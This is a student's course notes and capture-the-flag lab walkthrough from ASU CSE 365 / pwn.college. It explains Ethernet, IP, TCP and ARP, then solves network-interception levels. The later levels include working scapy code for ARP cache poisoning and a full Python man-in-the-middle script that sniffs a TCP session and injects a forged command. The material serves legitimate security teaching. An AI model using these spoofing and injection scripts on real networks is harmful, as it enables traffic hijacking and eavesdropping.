---
title: "Intercepting Communication"
description: ASU CSE 365, intercepting communication(finish)
date: 2023-02-10
image: pwncollege.png
math: 
license: 
hidden: false
comments: true
draft: false
categories:
    - Pwn.college
    - ForeignCourse

---

# Intercepting Communication

-----------**ASU CSE 365**: Introduction to Cybersecurity

## Intercepting Communication: Introduction

①network communication

>  A----email----->B 
>
>  A----email-->postal service box------>B 
>
> ##mailingprotocol is important!!
>
>  A----email-->postal service box------>C (not B)

②Dynamic network

physically linked

![](/img/pwn_college/lesson/dnetwork.png)

## Intercepting Communication: Ethernet

①**Ethernet:** a link layer protocol used for sending directly linked networked hosts packets of data between one and another 

**mac addresses:** describe the physical location of hosts like (`hostA: 11:22:33:44:55:66`)

**interface:** `hostA: eth0`

Host A to Host B : eth0 --->vethA --->bridge0 --->vethB --->eth0

②Ethernet packet structure

| Destination Mac Address | Source Mac Address | Type    |
| ----------------------- | ------------------ | ------- |
| 6 bytes                 | 6 bytes            | 2 bytes |

![](img/pwn_college/lesson/Estruct.png)

③Network Broadcast Transmission

TO EVERYONE. We convert the **Destination Mac Address** to `ff ff ff ff ff ff` and this is the Broadcast Mac Address.

## Intercepting Communication: Internet Protocol

**IP layer** Type: 08 00 (two bytes) for the Internet Protocol

{{<ppt src="/img/pdf/IP1.pdf" >}}

- Version: if it's 4, it indicates the Ipv4
- Internet Header Length: multiply it by four so 5*4 = 20 and the header is 20 bytes long.
- Differentiated Serviced Field: used in some applications
- Total Length: hex 0x14 is 20 in decimal and is equal to header length so in this case we're not stacking extra data on top
- identification: fragment the packet apart into a bunch of little small chunks. Identification is used for labeling 1,2,3...
- flags: bit0 is 0. bit1(DF) 1 for don't fragment. bit2(MF) 1for there're more fragments
- Fragment Offset: identify which piece of the fragment it is
- Time To Live: Have 64 hops before the packets get dropped. Preventing loops
- Protocol: declare what the follow-on contents protocol is (such as TCP, 06 means the TCP)
- Header Checksum: doing some sort of mathematical operation on the header, we can see if data was corrupted

## Intercepting Communication: Transmission Control Protocol

TCP: enable the stateful conversation between two hosts.

{{<ppt src="/img/pdf/TCP1.pdf" >}}

- Sequence Number: random initialized value(32bits)
- Acknowledgment Number: relative ACK number
- Data Offset: 5*4 = 20, after 20bytes is where the data starts
- Reserved: now we didn't need the 3bits
- Flags: declare operations
- Window Size: sending data should be shorter than this size at once 

**TCP flags** (6 of 9)

![](/img/pwn_college/lesson/TCPflags.png)

**TCP Transmission**

![](/img/pwn_college/lesson/TCPt.png)

In the penultimate packet, seq may be (B+N)

## Intercepting Communication: Address Resolution Protocol

we can set the TYPE in Ethernet Structure to `08 06` and destination to the `all-f`which means it is ARP. The ARP is used to convert the IP to MAC address.

{{<ppt src="/img/pdf/ARP1.pdf" >}}

- Hardware Type: the network type. For example, 00 01 is Ethernet address
- Protocol Type: 08 00 is IP
- Operation: 00 01: request, 00 10: reply

## babyintercept

**working within a virtual network in order to intercept networked traffic.**

level1: **connect to a remote host(The remote host at `x.x.x.x` is listening on port `123`)**

```shell
nc x.x.x.x 123 #get flag
```

level2: **listen for a connection from a remote host(You should listen on port `123`)**

```shell
nc -l 123 #-l:use listening mode to control incoming data + port
```

one uses `nc -l port`, another uses `nc (address)x.x.x.x port` and they can communicate with each other.

level3: **find and connect to a remote host(The remote host is somewhere on the `x.x.x.0/24` subnetwork, listening on port `123`)**

```shell
nmap -v x.x.x.0/24 -p 123 
#-v view the progress
#it will scan 256 networks(x.x.x.0 -- x.x.x.255) in order to find out which network is listening on port 123
nc x.x.x.x 123 #get the flag

Initiating Parallel DNS resolution of 1 host. at 08:28
Completed Parallel DNS resolution of 1 host. at 08:28, 13.00s elapsed
Initiating SYN Stealth Scan at 08:28
Scanning x.x.x.x [1 port]
Discovered open port 123/tcp on x.x.x.x
Completed SYN Stealth Scan at 08:28, 0.07s elapsed (1 total ports)
Nmap scan report for 10.0.0.223
Host is up (0.000045s latency).
```

level4: **The remote host is somewhere on the `x.0.0.0/16` subnetwork, listening on port `123`**

```shell
nmap -v x.x.x.0/16 -p 123 --min-rate 4096 #--min-rate: >=4096
#x.0.0.0/16 (4096 = 256*16)
#so x.0.0.0->x.0.16.0->x.0.32.0->x.0.48.0->x.0.64.0->x.0.80.0->x.0.96.0->x.0.112.0->x.0.128.0->x.0.144.0->x.0.160.0->x.0.176.0->x.0.192.0->x.0.208.0->x.0.224.0->x.0.240.0->x.0.255.255
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#Initiating SYN Stealth Scan at 06:27
#Scanning x.0.1.2 [1 port]
#Discovered open port 123/tcp on 10.0.125.87
#Completed SYN Stealth Scan at 06:27, 0.05s elapsed (1 total ports)
#Nmap scan report for 10.0.125.87
#Host is up (0.000053s latency).
#
#Nmap done: 65536 IP addresses (2 hosts up) scanned in 537.67 seconds
#           Raw packets sent: 131079 (3.670MB) | Rcvd: 12 (380B)
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
nc x.0.1.2 123
```

level5: **monitor traffic from a remote host.Your host is already receiving traffic on port `123`**

```shell
nc -l 123
#nc: Address already in use
```

we can use the `tcpdump` here or use the `wireshark`!

```shell
tcpdump -i eth0 'port 123'
# using this command we can see the traffic in the eth0 on port 123 and if we want to check the specified content, use the command below:
tcpdump -X -i eth0 'port 123'
#When parsing and printing, in addition to printing the headers of each packet, print the data of each  packet in hex and ASCII.
tcpdump -A -i eth0 'port 123'
#-A: Print each packet (minus its link level header) in ASCII.  Handy for capturing web pages.
#-i: interface
#-l: Line-based output
#-XX: Print out the data for each package in hexadecimal and ASCII format
#-r: read from a file
```

level6: **monitor slow traffic from a remote host** 

we use the wireshark to monitor the traffic in eth0, and click the `Follow-TCP Stream`

![](img/pwn_college/level6/Wireshark1.png)

![](img/pwn_college/level6/Wireshark2.png)

we can get the flag here.

level7: **hijack traffic from a remote host.The remote host at `x.0.0.4` is communicating with the remote host at `x.0.0.2` on port `123`.**

```shell
ip link set eth0 up		#Open the network card
ip link set eth0 down	#Close the network card
ip addr add 192.168.0.1/24 dev eth0
ip addr del 192.168.0.1/24 dev eth0
```

```shell
ip addr
#link/ether aa:c5:28:34:89:ec brd ff:ff:ff:ff:ff:ff link-netnsid 0
#    inet 10.0.0.3/16 scope global eth0
#       valid_lft forever preferred_lft forever
tcpdump -i any
#08:03:00.690459 eth0  B   ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28
ip addr add 10.0.0.2/16 dev eth0
tcpdump -i any
#08:04:22.102786 eth0  In  ARP, Reply 10.0.0.4 is-at e6:74:f8:9d:dc:53 (oui Unknown), length 28
#08:04:23.034965 eth0  Out ARP, Reply 10.0.0.2 is-at aa:c5:28:34:89:ec (oui Unknown), length 28
#08:04:23.034996 eth0  In  IP 10.0.0.4.56058 > 10.0.0.2.31337: Flags [S], seq 3053028927, win 64240, options [mss 1460,sackOK,TS val 1627029525 ecr 0,nop,wscale 7], length 0
#08:04:23.035009 eth0  Out IP 10.0.0.2.31337 > 10.0.0.4.56058: Flags [R.], seq 0, ack 3053028928, win 0, length 0
nc -l 123 #get the flag
```

level8: **manually send an Ethernet packet.The packet should have `Ether type=0xFFFF`and be sent to the remote host at `x.0.0.3`**

we would use the **scapy** tool

```shell
scapy
>>> Ether()
<Ether  |>
>>> Ether().display()
WARNING: Mac address to reach destination not found. Using broadcast.
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = 02:42:ac:14:00:26
  type      = 0x9000
>>>sendp(Ether(type=0xFFFF,src=get_if_hwaddr("eth0"),dst="ff:ff:ff:ff:ff:ff"), iface="eth0")#get the flag
#get_if_hwaddr can get the src physical address
#must have src,type and iface
```

level9: **manually send an Internet Protocol packet.The packet should have `IP proto=0xFF` and be sent to the remote host at `x.0.0.3`.**

```shell
>>> (Ether() / IP()).display()
###[ Ethernet ]### 
  dst       = ff:ff:ff:ff:ff:ff
  src       = 00:00:00:00:00:00
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = hopopt
     chksum    = None
     src       = 127.0.0.1
     dst       = 127.0.0.1
     \options   \
sendp(Ether(src=get_if_hwaddr("eth0")) / IP(proto=0xFF,dst="x.0.0.3"),iface="eth0")#get the flag
```

level10: **manually send a Transmission Control Protocol packet.The packet should have `TCP sport=31337, dport=31337, seq=31337, ack=31337, flags=APRSF` and be sent to the remote host at `x.0.0.3`.**

```shell
sendp(Ether(src=get_if_hwaddr("eth0")) / IP(dst="10.0.0.3") / TCP(sport=31337,dport=31337,seq=31337,ack=31337,flags="APRSF"),iface="eth0")
```

level11: **perform a Transmission Control Protocol handshake. The initial packet should have `TCP sport=31337, dport=31337, seq=31337` and should occur with the remote host at `x.0.0.3`.**

```shell
tmux
#ctrl+b,and c:add one terminal
#ctrl+b,and n:change to another terminal
tmux1:wireshark
tmux2:operation
```

① A---->B **SYN** (seq=`A`) 

```shell
sendp(Ether(src=get_if_hwaddr("eth0")) / IP(dst="10.0.0.3") / TCP(sport=31337,dport=31337,seq=31337,flags="S"),iface="eth0")
```

② B---->A **SYN,ACK** (seq=`B`, ack=`(A+1)`)

![](/img/pwn_college/level11/Handshake.png)

③ A---->B **ACK** (seq=`(A+1)`, ack=`(B+1)`)

```shell
sendp(Ether(src=get_if_hwaddr("eth0")) / IP(dst="10.0.0.3") / TCP(sport=31337,dport=31337,seq=31338,ack=3814219987,flags="A"),iface="eth0")
#get the flag
```

level12: **manually send an Address Resolution Protocol packet.The packet should have `ARP op=is-at` and correctly inform the remote host of where the sender can be found**

```shell
sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),psrc="x.0.0.2",pdst="x.0.0.3"),iface="eth0")
#op:who-is, is-at
#get the flag
```

level13: **hijack traffic from a remote host. You do not have the capabilities of a NET ADMIN.The remote host at `x.0.0.4` is communicating with the remote host at `x.0.0.2` on port `123`**

```shell
scapy
sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),psrc="x.0.0.2",pdst="x.0.0.4"),iface="eth0")
#get the flag
```

Process: **we can see the arp cache using the command 'arp -a' and the arp cache will update at regular intervals**

```
x.0.0.4 --- who-has x.0.0.2 says x.0.0.4 --->BROADCAST
x.0.0.2 ---> x.0.0.2 is-at aa:bb:cc:dd:ee:ff ---> x.0.0.4

ARP CACHE
60s starting now: x.0.0.2 is-at aa:bb:cc:dd:ee:ff

x.0.0.4 --- S --> x.0.0.2
x.0.0.2 --- SA -> x.0.0.4
x.0.0.4 --- A --> x.0.0.2
x.0.0.4 --- FLAG --> x.0.0.2

We need to forge arp packets to x.0.0.4, update the arp cache
```

level14: **man in the middle traffic between two remote hosts and inject extra traffic. The remote host at `x.0.0.4` is communicating with the remote host at `x.0.0.3` on port `123`.**

trying....

because of the remote server is very slow so I tried to `ssh` in my local kali linux. Just as followings: 

```shell
ssh-keygen -f key -N ''
cat key.pub
# copy the key.pub to pwn.college settings
ssh -i key hacker@dojo.pwn.college
#connected!!
#ok, it is not so good as I thought, and I should try to use scripts instead of manually using the terminals
```

Ok, finally I figured it out with the help of discord friends! As we know we can't manually use the terminals so we should use python scripts with **scapy**. There's a very cool function called {{< spoiler >}} sniffer {{</ spoiler >}} so we could use it to accept packets between x.0.0.3 and x.0.0.4

```python
//a.py ==>scripts
from scapy.all import *
#first craft a ARP packet to insert into them
#if we can use `ip addr add 10.0.0.3/16 dev eth0` would be better maybe but this time I seem not to use it.
sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),
            psrc="10.0.0.3",pdst="10.0.0.4"),iface="eth0") #tell 10.0.0.4，where 10.0.0.3 it is
sendp(Ether(src=get_if_hwaddr("eth0")) / ARP(op="is-at",hwsrc=get_if_hwaddr("eth0"),
            psrc="10.0.0.4",pdst="10.0.0.3"),iface="eth0") #tell 10.0.0.3，where 10.0.0.4 it is

#global!
key = ''
dst = ''
src = ''
ipdst = ''
ipsrc = ''
ipflags = ''
sport = 0
dport = 31337
flags = ''
seq = 0
ack = 0
def CallBack(packet):
    #print ( packet.show() )
    
    if packet.haslayer('TCP'):
        #print ("10.0.0.4 sport:",packet['TCP'].sport)
        #print ("dest Port:",packet['TCP'].dport) #31337
        global key 
        global dst
        global src 
        global ipdst 
        global ipsrc
        global ipflags
        global sport
        global dport
        global flags
        global seq
        global ack
        print("src:",packet['IP'].src)
        print("flags:",packet['TCP'].flags)
        print ("seq:",packet['TCP'].seq,"ack:",packet['TCP'].ack)
        try:
            print("load:",packet['TCP'].load)
            if packet['IP'].src=='10.0.0.4' and packet['TCP'].load != b'ECHO\n':
                key = packet['TCP'].load
            if packet['IP'].src == '10.0.0.4' and packet['TCP'].load == b'ECHO\n':
                print("echo!!")
                print(packet.show())
                
            if packet['IP'].src == '10.0.0.3' and packet['TCP'].load == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
                print("COMMAND!!")
                print(packet.show())
                ipdst = packet['IP'].src
                ipsrc = packet['IP'].dst
                flags = 'PA'
                ipflags = packet['IP'].flags
                dst = packet['Ethernet'].src
                src = packet['Ethernet'].dst
                dport = packet['TCP'].sport
                sport = packet['TCP'].dport
                seq = packet['TCP'].ack
                ack = packet['TCP'].seq+29
                raw_pkt = Raw(load='FLAG\n')
                (Ether(src=src,dst=dst) / IP(src=ipsrc,dst=ipdst,flags=ipflags) / 
                TCP(dport=dport,sport=sport,seq=seq,ack=ack,flags=flags) / raw_pkt).display()
                sendp(Ether(src=src,dst=dst) / IP(src=ipsrc,dst=ipdst,flags=ipflags) / 
                TCP(dport=dport,sport=sport,seq=seq,ack=ack,flags=flags) / raw_pkt,iface="eth0")

        except Exception as e:
            #print(e)
            print("no load")
            pass
        print("=========================")
        #print ("offset:",packet['TCP'].dataofs) #data offset

filter="tcp"

#the key function!
sniff(filter=filter, prn=CallBack, iface='eth0', count=50) #count of data packet
```

And I should tell the principle and theory here: 

```shell
4 -> 3 SYN
3 -> 4 SYNACK
4 -> 3 ACK
3 -> 4 PSHACK Secret
4 -> 3 ACK
4 -> 3 PSHACK Key data
3 -> 4 ACK
3 -> 4 PSHACK COMMANDLIST (contain echo and flag)
4 -> 3 ACK

#we should replace the ECHO packet from 4 or be quicker than it
4 -> 3 PSHACK ECHO
replace with
4 -> 3 PSHACK FLAG
#and we can see the flag here

3 -> 4 ACK
4 -> 3 PSHACK hello world
3 -> 4 ACK
3 -> 4 PSHACK hello world
4 -> 3 ACK
4 -> 3 FINACK
3 -> 4 FINACK
4 -> 3 ACK
```

what we should do is to check the packet of `COMMAND` and the packet of `ECHO` , then craft a `FLAG` packet like `ECHO` but quicker than it as soon as we get the packet of `COMMAND`. The ipsrc, ipdst, src, dst, dport, sport, seq, ack, flags, ipflags are the most important to get.

```shell
/challenge/run
python a.py
#wait and get flag
```

